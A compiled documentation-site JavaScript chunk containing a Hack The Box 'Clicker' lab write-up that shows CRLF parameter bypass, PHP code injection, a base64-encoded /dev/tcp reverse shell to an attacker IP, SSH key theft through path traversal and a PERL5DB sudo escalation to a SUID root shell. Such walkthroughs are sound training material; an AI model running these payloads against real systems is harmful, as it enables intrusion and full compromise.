"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[1330],{3187:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>d,frontMatter:()=>i,metadata:()=>a,toc:()=>o});const a=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/medium/Clicker/Clicker","title":"Clicker","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/medium/Clicker/Clicker.md","sourceDirName":"Hacking/Write-ups/Hack the box/medium/Clicker","slug":"/write-up/htb/medium/clicker","permalink":"/docs/write-up/htb/medium/clicker","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/medium/clicker","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var t=s(4848),r=s(8453);const i={slug:"/write-up/htb/medium/clicker",pagination_next:null,pagination_prev:null},c=void 0,l={},o=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Lateral movement",id:"lateral-movement",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function h(e){const n={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,t.jsx)(n.p,{children:"The machine has a NFS share sharing the source code"}),"\n",(0,t.jsx)(n.p,{children:"Checking the source code we see a potential SQL injection following a similar pattern of this:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://phpdelusions.net/pdo/sql_injection_example",children:"https://phpdelusions.net/pdo/sql_injection_example"})}),"\n",(0,t.jsxs)(n.p,{children:["curl -vv '",(0,t.jsx)(n.a,{href:"http://clicker.htb/save_game.php?clicks=0&level=0&nickname=blabla",children:"http://clicker.htb/save_game.php?clicks=0&level=0&nickname=blabla"}),"' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'"]}),"\n",(0,t.jsx)(n.p,{children:"We can arbirtraryly change key-values in the database in the query, however, there's a explicit check to try to change the role:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:"\tforeach($_GET as $key=>$value) {\n\t\tif (strtolower($key) === 'role') {\n\t\t\t// prevent malicious users to modify role\n\t\t\theader('Location: /index.php?err=Malicious activity detected!');\n\t\t\tdie;\n\t\t}\n"})}),"\n",(0,t.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,t.jsx)(n.p,{children:"In order to avoid this, we need to mask the key somehow, an idea can be to bypass that restriction using CR-LF injection:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -vv 'http://clicker.htb/save_game.php?role%0a=Admin' -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie'\n"})}),"\n",(0,t.jsx)(n.p,{children:"Now, we are admin in the PHP application and we can perform more enumerations."}),"\n",(0,t.jsx)(n.p,{children:"We discovered some interesting pages:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"admin.php: Generates a list with the top users."}),"\n",(0,t.jsxs)(n.li,{children:["export.php: Generate a file ",(0,t.jsx)(n.code,{children:"exports/top_players_fwhb6q51"}),", no more info. Maybe it's good to do user enumeration?"]}),"\n",(0,t.jsx)(n.li,{children:"diagnostic.php: Protected by a md5 token"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"We can access the generated files by the exporting function..."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -vv 'http://clicker.htb/export.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie' --data-raw 'threshold=0&extension=html'\n"})}),"\n",(0,t.jsx)(n.p,{children:"We can change the extension to PHP."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -vv 'http://clicker.htb/export.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh' --data-raw 'threshold=0&extension=php'\n"})}),"\n",(0,t.jsx)(n.p,{children:"We can change the nickname of the user to execute arbitrary PHP code. We'll change the nickname to make execute the following PHP code:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:"<?php $output = exec('id');echo \"$output\";?>\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -vv 'http://clicker.htb/save_game.php?clicks=0&level=0&nickname=%3C%3Fphp%20echo%20%221234%22%3B%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'\n"})}),"\n",(0,t.jsx)(n.p,{children:"Now we can repeat the process but to run a reverse shell:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:'<?php system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx|base64 -d|bash")?>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -vv 'http://clicker.htb/save_game.php?clicks=0&level=0&nickname=%3C%3Fphp%20system%28%22echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx%7Cbase64%20-d%7Cbash%22%29%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'\n"})}),"\n",(0,t.jsxs)(n.p,{children:["We get a shell for the user www-data. We discovered a user named ",(0,t.jsx)(n.code,{children:"jack"})," by checking /etc/passwd"]}),"\n",(0,t.jsx)(n.h2,{id:"lateral-movement",children:"Lateral movement"}),"\n",(0,t.jsxs)(n.p,{children:["During enumeration we discover there are two files in ",(0,t.jsx)(n.code,{children:"/opt"})," files:"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"monitor.sh: script that downloads the output of diagnostic.php, the user needs to be root"}),"\n",(0,t.jsx)(n.li,{children:"manage/README"}),"\n",(0,t.jsx)(n.li,{children:"manage/executequery: binary file that setup up all the environment"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Let's download it and analyse it using ",(0,t.jsx)(n.code,{children:"ghidra"})," ..."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'    iVar1 = atoi(*(char **)(param_2 + 8));\n    pcVar3 = (char *)calloc(0x14,1);\n    switch(iVar1) {\n    case 0:\n      puts("ERROR: Invalid arguments");\n      uVar2 = 2;\n      goto LAB_001015e1;\n    case 1:\n      strncpy(pcVar3,"create.sql",0x14);\n      break;\n    case 2:\n      strncpy(pcVar3,"populate.sql",0x14);\n      break;\n    case 3:\n      strncpy(pcVar3,"reset_password.sql",0x14);\n      break;\n    case 4:\n      strncpy(pcVar3,"clean.sql",0x14);\n      break;\n    default:\n      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);\n    }\n'})}),"\n",(0,t.jsxs)(n.p,{children:["There's a default option that would copy any provided value in param_2 into ",(0,t.jsx)(n.code,{children:"pcVar3"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"    local_98 = 0x616a2f656d6f682f;\n    local_90 = 0x69726575712f6b63;\n    local_88 = 0x2f7365;\n    sVar4 = strlen((char *)&local_98);\n    sVar5 = strlen(pcVar3);\n    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);\n    strcat(__dest,(char *)&local_98);\n    strcat(__dest,pcVar3);\n    setreuid(1000,1000);\n    iVar1 = access(__dest,4);\n    if (iVar1 == 0) {\n      local_78 = 0x6e69622f7273752f;\n      local_70 = 0x2d206c7173796d2f;\n"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"local_98"})," value corresponds to the string ",(0,t.jsx)(n.code,{children:"/home/jack"}),". So, what it's doing this program is forcing the provided file is inside ",(0,t.jsx)(n.code,{children:"/home/jack"})," folder, which we don't have access. However, we can read the private SSH key with this mechanism:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa\nmysql: [Warning] Using a password on the command line interface can be insecure.\n--------------\n-----BEGIN OPENSSH PRIVATE KEY---\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Now we just need to adapt the private key format comparing with some valid private key and boom, we are in as ",(0,t.jsx)(n.code,{children:"jack"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"ssh jack@clicker.htb -i ../exfil/priv_key \n"})}),"\n",(0,t.jsx)(n.p,{children:"And we can read the user flag."}),"\n",(0,t.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"sudo -l"})," shows interesting stuff:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"User jack may run the following commands on clicker:\n    (ALL : ALL) ALL\n    (root) SETENV: NOPASSWD: /opt/monitor.sh\n"})}),"\n",(0,t.jsx)(n.p,{children:"First of all, we try to run the monitoring script to see what happens:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'jack@clicker:~$ sudo /opt/monitor.sh \n<?xml version="1.0"?>\n<data>\n'})}),"\n",(0,t.jsxs)(n.p,{children:["An potential way to exploit this, is set the ",(0,t.jsx)(n.code,{children:"EUID"})," to a number different than 0 so that it enters in the if when the user is not root:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\nif [ "$EUID" -ne 0 ]\n  then echo "Error, please run as root"\n  exit\nfi\n\nset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nunset PERL5LIB;\nunset PERLLIB;\n'})}),"\n",(0,t.jsxs)(n.p,{children:["The PATH is not well protected and if we provide the proper PATH variable, we can make ",(0,t.jsx)(n.code,{children:"echo"})," program to point to our fradulent implementation ... Let's give it a try ..."]}),"\n",(0,t.jsxs)(n.p,{children:["Interesting, this technique does not seem to work with ",(0,t.jsx)(n.code,{children:"echo"})," for some kind of reason but work with ",(0,t.jsx)(n.code,{children:"ls"})," for instance. Looks like ",(0,t.jsx)(n.code,{children:"echo"})," is a bult-in executable in the shell and does not use the ",(0,t.jsx)(n.code,{children:"PATH"})," variable to determine where is it."]}),"\n",(0,t.jsxs)(n.p,{children:["We can use ",(0,t.jsx)(n.code,{children:"PERL5OPT"})," to set the debugger flag for perl and ",(0,t.jsx)(n.code,{children:"PERL5DB"})," to specify the command we want to use as a debugger:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(\"ls\");' /opt/monitor.sh \nqueries  user.txt\n"})}),"\n",(0,t.jsx)(n.p,{children:"However, if we try to get a shell from here, we'll fail:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(\"/bin/bash\");' /opt/monitor.sh \n/bin/bash: line 1: syntax error near unexpected token `newline'\n/bin/bash: line 1: `<?xml version=\"1.0\"?>'\nNo DB::DB routine defined at /usr/bin/xml_pp line 9.\nNo DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.\nEND failed--call queue aborted.\n"})}),"\n",(0,t.jsx)(n.p,{children:"But, we can do a nasty thing, we can set the SUID flag so that if keeps the root permission, even if the user is not root:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo PERL5OPT=-d PERL5DB='system(\"chmod u+s /bin/bash\");' /opt/monitor.sh\n\njack@clicker:~$ ls -la /bin/bash\n-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash\n"})}),"\n",(0,t.jsx)(n.p,{children:"If we run bash normally we'll not get the root console:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"jack@clicker:~$ bash\nbash-5.1$ whoami\njack\n"})}),"\n",(0,t.jsxs)(n.p,{children:["However, there's a flag ",(0,t.jsx)(n.code,{children:"-p"})," in bash to use the effective user id instead of the real user id:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"jack@clicker:~$ bash -p\nbash-5.1# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.p,{children:"And now we can read the root flag."})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>c});var a=s(6540);const t={},r=a.createContext(t);function i(e){const n=a.useContext(r);return a.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);